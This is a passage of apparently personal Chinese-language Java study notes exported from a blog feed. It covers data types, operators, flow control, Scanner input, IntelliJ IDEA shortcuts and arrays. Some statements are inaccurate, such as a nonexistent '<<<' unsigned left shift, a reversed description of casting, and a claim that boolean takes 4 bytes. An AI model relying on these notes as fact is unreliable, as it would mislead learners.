<li>如果数组索引为i的位置上的元素个数达到8个且数组长度大于64，会将此位置上的多个元素改为使用红黑树存储，提高增删查找效率</li>
<li>当使用红黑树的索引为i的位置上的元素个数低于6个时，退化为单向链表，减少存储空间占用<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719001310.png" alt="结构示例"></li>
</ul>
</li>
</ol>
<p><strong>LinkedHashMap</strong></p>
<p>构造器直接调用父类HashMap的构造器，put()方法是父类的方法，但重写了newNode()方法，此为put方法内调用的<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719002242.png" alt="LinkedHashMap"></p>
]]></content>
      <categories>
        <category>Java</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Note1-符号流程工具数组</title>
    <url>/2024/06/12/Java-Note1-%E7%AC%A6%E5%8F%B7%E6%B5%81%E7%A8%8B%E5%B7%A5%E5%85%B7%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>Java基本语法</p>
<span id="more"></span>

<p><a href="https://www.bilibili.com/video/BV1PY411e7J6/?p=15&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-java基础教程</a><br><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程-java</a><br><a href="https://www.runoob.com/manual/jdk11api/index.html">Java API 参考文档</a><br>参考书籍:《java核心技术》《Effective Java》 《java编程思想》</p>
<h2 id="第01章-Java语言概述"><a href="#第01章-Java语言概述" class="headerlink" title="第01章_Java语言概述"></a>第01章_Java语言概述</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240707151545.png" alt="java虚拟机内存结构"></p>
<h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>编译执行过程：<br>.java源文件–&gt;(javac.exe编译)–&gt;.class字节码文件–&gt;(java.exe解释运行)–&gt;结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac HelloWorld.java</span><br><span class="line">java HelloWorld <span class="comment">#生成的.class字节码文件名</span></span><br></pre></td></tr></table></figure>

<p>第一个java程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释（与C++存在的不同）：</p>
<ol>
<li>main方法格式固定：public static void main(String[] args){} 或 public static void main(String args[]){}</li>
<li>输出方法println()输出数据后会换行，print()不会</li>
<li>编译后每个类都会生成一个对应.class文件，文件名同类名</li>
<li>一个源文件只能声明一个public的类，且此类名必须与源文件名相同！</li>
</ol>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>先写注释（开发思路）后写程序</p>
<ol>
<li>单行注释： &#x2F;&#x2F;注释</li>
<li>多行注释：&#x2F;*注释*&#x2F;</li>
<li>文档注释：&#x2F;**注释(开头两个*)*&#x2F;<ul>
<li>文档注释的内容可以被JDK提供的工具javadoc解析，生成一套以网页文件形式体现的程序说明文档</li>
<li>使用命令生成:javadoc -d yourDocumentName -author -version .javaFileName</li>
</ul>
</li>
</ol>
<h3 id="jvm-与-java特性"><a href="#jvm-与-java特性" class="headerlink" title="jvm 与 java特性"></a>jvm 与 java特性</h3><p>跨平台、面向对象，健壮，安全，简单，高性能<br>jvm:java运行环境虚拟机，可以实现程序跨平台和自动内存管理、</p>
<h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><ol>
<li>java中仍然可能出现内存泄露和内存溢出问题（自动管理内存时把一些应当释放的”垃圾”没有视为垃圾）</li>
<li><code>\n,\t</code>等符号仍然可用</li>
<li>软件：一系列按照特定顺序组织的计算机数据与指令的集合</li>
</ol>
<p>企业面试：</p>
<ol>
<li>一个源文件可以声明多个类，但必须有且只有一个类使用public声明且其类名与文件名相同</li>
<li>java优势:跨平台 安全 简单 高性能 面向对象 健壮</li>
<li>java仍存在内存泄露和内存溢出</li>
<li>java是半编译半解释语言：源码经编译生成字节码文件后，可能跳过解释器解释执行，也可以通过JIT编译器编译执行</li>
</ol>
<p>学习路线：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250109094848.png"></p>
<h2 id="第02章-变量与运算符"><a href="#第02章-变量与运算符" class="headerlink" title="第02章_变量与运算符"></a>第02章_变量与运算符</h2><h3 id="标识符命名规则"><a href="#标识符命名规则" class="headerlink" title="标识符命名规则"></a>标识符命名规则</h3><ol>
<li>由26个字母大小写和0-9,_,$组成</li>
<li>数字不能开头</li>
<li>不可使用关键字和保留字</li>
<li>严格区分大小写，长度不限</li>
<li>不能含有空格</li>
</ol>
<p>命名规范</p>
<ol>
<li>尽量使用能概括该标识符作用的英语单词</li>
<li>包名多单词组成时全部小写</li>
<li>类名，接口名多单词组成时每个单词首字母大写</li>
<li>变量，方法名多单词组成时，首个单词首字母小写，其余单词首字母大写</li>
<li>常量名多单词组成每个单词使用下划线连接，全部大写</li>
</ol>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>变量存储在内存区域，每个变量都必须声明其数据类型！！java是强数据类型语言<br>java数据类型：</p>
<ul>
<li>基本数据类型<ul>
<li>整型 byte(8bit) short (2字节) int(4字节) long(8字节)<br>long类型变量赋值时需要以”l”或”L”结尾，尽量别用<br>常量默认为int型，所以short a &#x3D; 10; a &#x3D; a + 1;会报错！但a+&#x3D;1可以<br>因此尽可能使用int数据类型</li>
<li>浮点型 float(4字节) double(8字节)<br>float类型变量赋值时需要以”f”或”F”结尾</li>
<li>字符型 char(2字节!)<br><strong>java采用union code编码</strong>，两个字节表示一个字符，使用单引号括起，转义符”\n换行 \t制表 &quot;双引号 &#39;单引号 \\反斜线 \b退格 \r回车”</li>
<li>布尔型 boolean(4字节，int，相当于常量)</li>
</ul>
</li>
<li>引用数据类型<ul>
<li>类 class</li>
<li>数组 array</li>
<li>接口 interface</li>
<li>枚举 enum</li>
<li>注释 annotation</li>
<li>记录 recode</li>
</ul>
</li>
</ul>
<p>字符型(char)的三种种赋值方法：</p>
<ol>
<li>直接赋值：char a &#x3D; ‘a’;</li>
<li>union code赋值 char a &#x3D; ‘\u0036’;</li>
<li>ASCII码赋值 char a &#x3D; 97 适用于ascii码表内数</li>
</ol>
<h3 id="运算规则和类型转换"><a href="#运算规则和类型转换" class="headerlink" title="运算规则和类型转换"></a>运算规则和类型转换</h3><p>数据类型之间的运算规则</p>
<blockquote>
<p>当表示数据范围小的数与表示范围大的数运算时，结果自动转为表示范围较大的类型：<br>byte,short–&gt;int–&gt;long–&gt;float–&gt;double<br>特别地：byte,short,char类型之间(bb,bs,ss,cc)运算，结果均为int</p>
</blockquote>
<p>强制类型转换<br>当表示数据范围小的数转换为表示范围大的数时，使用()强制类型转换,可能导致精度损失。<br>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="number">12</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">d2</span> <span class="operator">=</span> (<span class="type">int</span>)d1;</span><br></pre></td></tr></table></figure>

<h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><p>1 string数据类型</p>
<ol>
<li>字符串内部可以包含0到多个字符</li>
<li>与基本数据类型间只能进行连接运算(+)，结果仍为string</li>
<li>不能通过强制类型转换为基本数据类型,反之亦不可,但可以通过<code>+&quot;&quot;</code>实现</li>
<li>与基本数据类型进行运算时，字符串在右为加法运算，字符串在左为连接运算</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="number">3</span>+<span class="number">4</span>+<span class="string">&quot;Hello!&quot;</span>); <span class="comment">//输出7Hello!</span></span><br><span class="line">System.out.println(<span class="string">&quot;Hello!&quot;</span>+<span class="number">3</span>+<span class="number">4</span>); <span class="comment">//输出Hello!34</span></span><br><span class="line">System.out.println(<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>+<span class="string">&quot;Hello!&quot;</span>); <span class="comment">//输出98Hello!</span></span><br><span class="line">System.out.println(<span class="string">&quot;Hello!&quot;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>); <span class="comment">//输出Hello!a1</span></span><br><span class="line">System.out.println(<span class="string">&quot;*&quot;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;*&quot;</span>);<span class="comment">//输出 *   *</span></span><br><span class="line">System.out.println(<span class="string">&#x27;*&#x27;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;*&quot;</span>);<span class="comment">//输出 *   *</span></span><br><span class="line">System.out.println(<span class="string">&#x27;*&#x27;</span>+<span class="string">&#x27;\t&#x27;</span>+<span class="string">&quot;*&quot;</span>);<span class="comment">//输出数值结果</span></span><br><span class="line">System.out.println(<span class="string">&#x27;*&#x27;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&#x27;*&#x27;</span>);<span class="comment">//输出 *   *</span></span><br><span class="line">System.out.println(<span class="string">&quot;*&quot;</span>+<span class="string">&#x27;\t&#x27;</span>+<span class="string">&#x27;*&#x27;</span>);<span class="comment">//输出 *   *</span></span><br><span class="line">System.out.println(<span class="string">&#x27;*&#x27;</span>+<span class="string">&#x27;\t&#x27;</span>+<span class="string">&#x27;*&#x27;</span>);<span class="comment">//输出数值结果</span></span><br></pre></td></tr></table></figure>

<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><table>
<thead>
<tr>
<th>分类</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>算术运算符</td>
<td>+, -, *, &#x2F;, %, ++, –</td>
</tr>
<tr>
<td>赋值运算符</td>
<td>&#x3D;, +&#x3D;, -+, *&#x3D;, &#x2F;&#x3D;, %&#x3D;, &gt;&gt;&#x3D;, &lt;&lt;&#x3D;, &gt;&gt;&gt;&#x3D;, &amp;&#x3D;, |&#x3D;, ^&#x3D;</td>
</tr>
<tr>
<td>关系运算符</td>
<td>&gt;, &gt;&#x3D;, &lt;&#x3D;, &lt;, &#x3D;&#x3D;, !&#x3D;</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td>&amp;, |, ^, !, &amp;&amp;, ||</td>
</tr>
<tr>
<td>位运算符</td>
<td>&amp;, |, ^, ~, &lt;&lt;, &gt;&gt;, &gt;&gt;&gt;</td>
</tr>
<tr>
<td>条件运算符</td>
<td>(条件表达式)?结果1:结果2</td>
</tr>
<tr>
<td>Lambda运算符</td>
<td>-&gt;</td>
</tr>
</tbody></table>
<ol>
<li>取模结果符号与被摸数符号相同</li>
<li>&#x3D;赋值可以连续赋值：a&#x3D;b&#x3D;c&#x3D;3</li>
<li>+&#x3D;等符号不会改变原数据的数据类型，所以<code>short a=1;a+=1;</code>是可行的。所以与常数运算尽量使用+&#x3D;等符号以符合原数据类型。</li>
<li>&amp; 与 &amp;&amp;，| 与 ||均代表与&#x2F;或，其区别在于，&amp;&amp;和||若左式子为false(&amp;&amp;)&#x2F;true(||)不会执行和判断右式子</li>
<li>&gt;&gt;&gt;无符号右移，&lt;&lt;&lt;无符号左移</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>++的运算  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">m = m++;<span class="comment">//结果m=2，字节码相当于暂存原值2，然后m=m+1；然后再将暂存值2赋给m</span></span><br></pre></td></tr></table></figure></li>
<li>java中计算金额不能使用double或者float，应当使用BigDecimal类</li>
</ol>
<h2 id="第03章-流程控制语句"><a href="#第03章-流程控制语句" class="headerlink" title="第03章_流程控制语句"></a>第03章_流程控制语句</h2><p>顺序，分支，循环</p>
<h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>既可以使用switch-case又可以使用if-else且二者实现难度相差不大时，应当使用switch-case(等运算比不等运算简单高效)</p>
<ol>
<li>if-else 分支语句 与 C语言相同，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>switch-case分支语句 与 C语言相同，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">1</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">2</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>表达式只能是<code>byte</code>,<code>short</code>,<code>int</code>,<code>char</code>,<code>枚举</code>,<code>String</code></li>
<li>case匹配情况有限时才使用，比较消耗运行速度。</li>
<li>case穿透，用于多种情况执行统一语句，例如针对月份日：  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(month)&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">    sumDays += <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">    sumDays += <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    sumDays += <span class="number">30</span>;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    sumDays += day;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>三种循环结构：for;do-while;while<br>四要素：初始化条件，循环条件，循环体，迭代部分<br>while循环与for循环的区别是初始化条件(i)作用域不同，while循环初始化条件在循环结束仍然有效(当i在for的括号中声明时)<br>方案选择：</p>
<ul>
<li>遍历有明显循环次数（范围）的需求，使用for</li>
<li>遍历没有明显循环次数的需求，选择while</li>
<li>循环体至少执行一次的，使用do-while</li>
</ul>
<ol>
<li>for循环语句 与 C++语言相同，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="comment">/*a*/</span><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">/*b*/</span>i &lt; <span class="number">10</span>;<span class="comment">/*c*/</span>System.out.print(<span class="string">&quot;this will be execute&quot;</span>),i++)&#123;</span><br><span class="line">  <span class="comment">/*d*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>执行顺序a-&gt;b-&gt;d-&gt;c-&gt;b-&gt;d-&gt;c-&gt;…</li>
</ul>
</li>
<li>while循环语句 与 C++语言相同，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">10</span>)&#123;</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>do-while循环语句 与 C++语言相同，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(表达式);</span><br></pre></td></tr></table></figure>
<ul>
<li>do-while循环至少执行一次循环体</li>
</ul>
</li>
<li>“无限”循环的使用：<br>for(;;) while(true)<br>结合break;实现在特定情况下退出</li>
<li>关键字<strong>break</strong>和<strong>continue</strong><ul>
<li>break: 结束当前循环，执行循环外代码</li>
<li>continue: 结束当前轮次循环，进入新一轮次循环</li>
<li>两关键字所在{}层内关键字后不可再写任何语句，写了也永不执行，会报错</li>
<li><strong>重要应用</strong>基于标签的退出：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">label:<span class="keyword">for</span>(;;)&#123;</span><br><span class="line"> <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">   <span class="keyword">if</span>()&#123;</span><br><span class="line">     <span class="keyword">break</span> label;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="键盘输入"><a href="#键盘输入" class="headerlink" title="键盘输入"></a>键盘输入</h3><p>步骤：</p>
<ol>
<li>导入包 import java.util.Scanner</li>
<li>提供&#x2F;创建一个Scanner类的实例</li>
<li>调用Scanner类中方法，获取指定类型变量</li>
<li>关闭资源，调用类中close()，避免内存溢出</li>
</ol>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//创建一个Scanner类实例</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> scan.next();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> scan.nextInt();</span><br><span class="line">        System.out.println(age);</span><br><span class="line">        <span class="type">double</span> <span class="variable">weight</span> <span class="operator">=</span> scan.nextDouble();</span><br><span class="line">        System.out.println(weight);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSingle</span> <span class="operator">=</span> scan.nextBoolean();</span><br><span class="line">        System.out.println(isSingle);</span><br><span class="line">        <span class="type">char</span> <span class="variable">gender</span> <span class="operator">=</span> scan.next().charAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(gender);</span><br><span class="line">        scan.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
<li>流程控制的三种结构：顺序循环分支</li>
<li>两种分支结构，三种循环结构</li>
<li>switch-case表达式能用的数据类型：byte,short,int,char,String,枚举</li>
<li>switch-case的case穿透</li>
<li>循环结构的四要素，三种循环的使用场景</li>
<li>无限循环和break,continue的使用和区别</li>
<li>if-else使用场景广，switch-case常量时效率高，有穿透</li>
</ol>
<h2 id="第04章-IDEA的安装与使用"><a href="#第04章-IDEA的安装与使用" class="headerlink" title="第04章_IDEA的安装与使用"></a>第04章_IDEA的安装与使用</h2><p><em>CLASSPATH</em> 不要设置，否则使用java …. 解释运行时会到CLASSPATH寻找字节码文件<br>CLASSPATH:.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;<br>JDK(JRE(JVM+Java SE)+)</p>
<p>层级关系：<br>project(工程)-&gt;module(模块)-&gt;package(包)-&gt;class(类)<br><a href="https://www.bilibili.com/video/BV1PY411e7J6?p=61&vd_source=20530c92c1be8bd70e37346e3a5c037a">IDEA使用</a><br><a href="https://www.bilibili.com/video/BV1PY411e7J6?p=60&vd_source=20530c92c1be8bd70e37346e3a5c037a">IDEA常用修改</a></p>
<h3 id="1-IDEA的快捷键"><a href="#1-IDEA的快捷键" class="headerlink" title="1-IDEA的快捷键"></a>1-IDEA的快捷键</h3><p>第1组：通用型</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>复制代码-copy</td>
<td>ctrl + c</td>
</tr>
<tr>
<td>粘贴-paste</td>
<td>ctrl + v</td>
</tr>
<tr>
<td>剪切-cut</td>
<td>ctrl + x</td>
</tr>
<tr>
<td>撤销-undo</td>
<td>ctrl + z</td>
</tr>
<tr>
<td>反撤销-redo</td>
<td>ctrl + shift + z</td>
</tr>
<tr>
<td>保存-save all</td>
<td>ctrl + s</td>
</tr>
<tr>
<td>全选-select all</td>
<td>ctrl + a</td>
</tr>
</tbody></table>
<p>第2组：提高编写速度（上）</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>智能提示-edit</td>
<td>alt + enter</td>
</tr>
<tr>
<td>提示代码模板-insert live template</td>
<td>ctrl+j</td>
</tr>
<tr>
<td>使用xx块环绕-surround with …</td>
<td>ctrl+alt+t</td>
</tr>
<tr>
<td>调出生成getter&#x2F;setter&#x2F;构造器等结构-generate …</td>
<td>alt+insert</td>
</tr>
<tr>
<td>自动生成返回值变量-introduce variable …</td>
<td>ctrl+alt+v</td>
</tr>
<tr>
<td>复制指定行的代码-duplicate line or selection</td>
<td>ctrl+d</td>
</tr>
<tr>
<td>删除指定行的代码-delete line</td>
<td>ctrl+y</td>
</tr>
<tr>
<td>切换到下一行代码空位-start new line</td>
<td>shift + enter</td>
</tr>
<tr>
<td>切换到上一行代码空位-start new line before current</td>
<td>ctrl +alt+ enter</td>
</tr>
<tr>
<td>向上移动代码-move statement up</td>
<td>ctrl+shift+↑</td>
</tr>
<tr>
<td>向下移动代码-move statement down</td>
<td>ctrl+shift+↓</td>
</tr>
<tr>
<td>向上移动一行-move line up</td>
<td>alt+shift+↑</td>
</tr>
<tr>
<td>向下移动一行-move line down</td>
<td>alt+shift+↓</td>
</tr>
<tr>
<td>方法的形参列表提醒-parameter info</td>
<td>ctrl+p</td>
</tr>
</tbody></table>
<p>第3组：提高编写速度（下）</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>批量修改指定的变量名、方法名、类名等-rename</td>
<td>shift+f6</td>
</tr>
<tr>
<td>抽取代码重构方法-extract method …</td>
<td>ctrl+alt+m</td>
</tr>
<tr>
<td>重写父类的方法-override methods …</td>
<td>ctrl+o</td>
</tr>
<tr>
<td>实现接口的方法-implements methods …</td>
<td>ctrl+i</td>
</tr>
<tr>
<td>选中的结构的大小写的切换-toggle case</td>
<td>ctrl+shift+u</td>
</tr>
<tr>
<td>批量导包-optimize imports</td>
<td>ctrl+alt+o</td>
</tr>
</tbody></table>
<p>第4组：类结构、查找和查看源码</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>如何查看源码-go to class…</td>
<td>ctrl + 选中指定的结构 或 ctrl+n</td>
</tr>
<tr>
<td>显示当前类结构，支持搜索指定的方法、属性等-file structure</td>
<td>ctrl+f12</td>
</tr>
<tr>
<td>退回到前一个编辑的页面-back</td>
<td>ctrl+alt+←</td>
</tr>
<tr>
<td>进入到下一个编辑的页面-forward</td>
<td>ctrl+alt+→</td>
</tr>
<tr>
<td>打开的类文件之间切换-select previous&#x2F;next tab</td>
<td>alt+←&#x2F;→</td>
</tr>
<tr>
<td>光标选中指定的类，查看继承树结构-Type Hierarchy</td>
<td>ctrl+h</td>
</tr>
<tr>
<td>查看方法文档-quick documentation</td>
<td>ctrl+q</td>
</tr>
<tr>
<td>类的UML关系图-show uml popup</td>
<td>ctrl+alt+u</td>
</tr>
<tr>
<td>定位某行-go to line&#x2F;column</td>
<td>ctrl+g</td>
</tr>
<tr>
<td>回溯变量或方法的来源-go to implementation(s)</td>
<td>ctrl+alt+b</td>
</tr>
<tr>
<td>折叠方法实现-collapse all</td>
<td>ctrl+shift+ -</td>
</tr>
<tr>
<td>展开方法实现-expand all</td>
<td>ctrl+shift+ +</td>
</tr>
</tbody></table>
<p>第5组：查找、替换与关闭</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>查找指定的结构</td>
<td>ctlr+f</td>
</tr>
<tr>
<td>快速查找：选中的Word快速定位到下一个-find next</td>
<td>ctrl+l</td>
</tr>
<tr>
<td>查找与替换-replace</td>
<td>ctrl+r</td>
</tr>
<tr>
<td>直接定位到当前行的首位-move caret to line start</td>
<td>home</td>
</tr>
<tr>
<td>直接定位到当前行的末位 -move caret to line end</td>
<td>end</td>
</tr>
<tr>
<td>查询当前元素在当前文件中的引用，然后按 F3 可以选择</td>
<td>ctrl+f7</td>
</tr>
<tr>
<td>全项目搜索文本-find in path …</td>
<td>ctrl+shift+f</td>
</tr>
<tr>
<td>关闭当前窗口-close</td>
<td>ctrl+f4</td>
</tr>
</tbody></table>
<p>第6组：调整格式</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>格式化代码-reformat code</td>
<td>ctrl+alt+l</td>
</tr>
<tr>
<td>使用单行注释-comment with line comment</td>
<td>ctrl + &#x2F;</td>
</tr>
<tr>
<td>使用&#x2F;取消多行注释-comment with block comment</td>
<td>ctrl + shift + &#x2F;</td>
</tr>
<tr>
<td>选中数行，整体往后移动-tab</td>
<td>tab</td>
</tr>
<tr>
<td>选中数行，整体往前移动-prev tab</td>
<td>shift + tab</td>
</tr>
</tbody></table>
<p>2-Debug快捷键</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>单步调试（不进入函数内部）- step over</td>
<td>F8</td>
</tr>
<tr>
<td>单步调试（进入函数内部）- step into</td>
<td>F7</td>
</tr>
<tr>
<td>强制单步调试（进入函数内部） - force step into</td>
<td>alt+shift+f7</td>
</tr>
<tr>
<td>选择要进入的函数 - smart step into</td>
<td>shift + F7</td>
</tr>
<tr>
<td>跳出函数 - step out</td>
<td>shift + F8</td>
</tr>
<tr>
<td>运行到断点 - run to cursor</td>
<td>alt + F9</td>
</tr>
<tr>
<td>继续执行，进入下一个断点或执行完程序 - resume program</td>
<td>F9</td>
</tr>
<tr>
<td>停止 - stop</td>
<td>Ctrl+F2</td>
</tr>
<tr>
<td>查看断点 - view breakpoints</td>
<td>Ctrl+Shift+F8</td>
</tr>
<tr>
<td>关闭 - close</td>
<td>Ctrl+F4</td>
</tr>
</tbody></table>
<h3 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h3><ul>
<li><p>创建模块:右键项目名-新建-模块</p>
</li>
<li><p>导入模块：复制文件夹到项目文件夹下，文件-项目结构-模块-导入模块</p>
</li>
<li><p>设置模板<br>设置-&gt;编辑器-&gt;实时模板-&gt; + -&gt;建一个自定义模板组(以后都在CustomerDefine中，可以省略此步) -&gt; + -&gt;新建模板 -&gt;建好后点击左下角定义，选中java -&gt; 确定即可</p>
</li>
</ul>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>步骤：</p>
<ol>
<li>添加断点<ul>
<li>行断点 左侧行号栏点击</li>
<li>方法断点 方法声明处行号栏点击 执行时停止</li>
<li>字段断点 变量声明处行号栏点击 修改值时停止</li>
<li>条件断点 行号栏点击可以输入条件 满足条件停止</li>
</ul>
</li>
<li>启动调试</li>
<li>单步执行</li>
<li>观察变量和执行流程，找到并解决问题</li>
</ol>
<h2 id="第05章-数组"><a href="#第05章-数组" class="headerlink" title="第05章_数组"></a>第05章_数组</h2><p>数组与C++语言类似</p>
<h3 id="一维数组的使用"><a href="#一维数组的使用" class="headerlink" title="一维数组的使用"></a>一维数组的使用</h3><ol>
<li>声明和初始化(下为方法中的示例)<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="type">double</span>[] number0;</span><br><span class="line"><span class="comment">// 静态初始化</span></span><br><span class="line">number0 = <span class="keyword">new</span> <span class="title class_">double</span>[]&#123;<span class="number">20.11</span>,<span class="number">20.1</span>,<span class="number">20.3</span>&#125;;</span><br><span class="line"><span class="comment">// 声明+动态初始化</span></span><br><span class="line"><span class="type">int</span>[] number1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//可以省略为</span></span><br><span class="line"><span class="type">int</span>[] number2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//类型推断</span></span><br></pre></td></tr></table></figure></li>
<li>调用，通过下标实现；遍历使用下标</li>
<li>获取长度 .length</li>
<li>数组元素的默认初始化值<ul>
<li>整型数组默认为0</li>
<li>浮点型数组默认0.0</li>
<li>字符型数组默认0(‘\u0000’)</li>
<li>boolean型默认false</li>
<li>引用型数组默认null</li>
</ul>
</li>
<li>内存结构 int[] arr &#x3D; new int[]{1,2,3};<ul>
<li>Java将内存划分为5部分：程序计数器，虚拟机栈，本地方法栈，堆，方法区</li>
<li>虚拟机栈存储方法中声明的遍历，如arr</li>
<li>堆存储数组的实体（即数组中的所有元素）。如1，2，3</li>
<li>数组只有用到new时才分配堆中内存</li>
</ul>
</li>
</ol>
<h3 id="多维数组的使用"><a href="#多维数组的使用" class="headerlink" title="多维数组的使用"></a>多维数组的使用</h3><ol>
